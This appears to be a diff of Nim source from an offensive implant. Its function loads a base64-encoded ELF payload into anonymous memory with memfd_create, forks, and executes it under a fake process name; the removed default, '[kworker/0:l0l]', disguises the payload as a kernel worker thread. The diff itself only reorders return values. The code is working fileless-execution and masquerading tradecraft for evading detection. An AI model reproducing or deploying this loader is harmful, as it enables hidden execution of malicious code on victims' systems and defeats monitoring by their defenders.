@@ -7,7 +7,7 @@ proc execve(pathname: cstring, argv: ptr cstring, envp: cstring): cint {.nodecl,
 proc memfd_create(name: cstring, flags: cint): cint {.header: "<sys/mman.h>", importc: "memfd_create".}
 proc dup2(oldfd: FileHandle, newfd: FileHandle): cint {.importc, header: "unistd.h".}
 
-proc load_memfd*(elf_base64: string, fake_process_name = protectString("[kworker/0:l0l]"), is_task=false): (string, bool) =
+proc load_memfd*(elf_base64: string, fake_process_name: string, is_task=false): (bool, string) =
     #[
         Load ELF in memory using memfd_create syscall
         has 2 modes:
@@ -26,7 +26,7 @@ proc load_memfd*(elf_base64: string, fake_process_name = protectString("[kworker
     let fd_path = protectString("/proc/self/fd/") & $fd
     # memfd_create failed
     if fd == -1:
-        return ("", false)
+        return (false, "")
     
     # write the elf payload to the anonymous file
     var memfd_file: File
@@ -37,7 +37,7 @@ proc load_memfd*(elf_base64: string, fake_process_name = protectString("[kworker
     let pid = fork()
     # fork failed
     if pid == -1:
-        return ("", false)
+        return (false, "")
 
     # father
     if pid > 0:
@@ -47,10 +47,10 @@ proc load_memfd*(elf_base64: string, fake_process_name = protectString("[kworker
             discard waitPid(cint(pid), status, WUNTRACED)
             var output = readFile(redirect_filepath)
             removeFile(redirect_filepath)
-            return (output, true)
+            return (true, output)
         # implant mode - return
         else:
-            return ("", true)
+            return (true, "")
     
     # if is_task file path supplied - redirect stdout & stderr to it
     if is_task:
@@ -63,4 +63,4 @@ proc load_memfd*(elf_base64: string, fake_process_name = protectString("[kworker
     var fake_process_array = (@[fake_process_name]).allocCStringArray()
     discard execve(fd_path, fake_process_array[0].addr, nil)
     # execve failed (should not return on success)
-    return ("", false)
+    return (false, "")
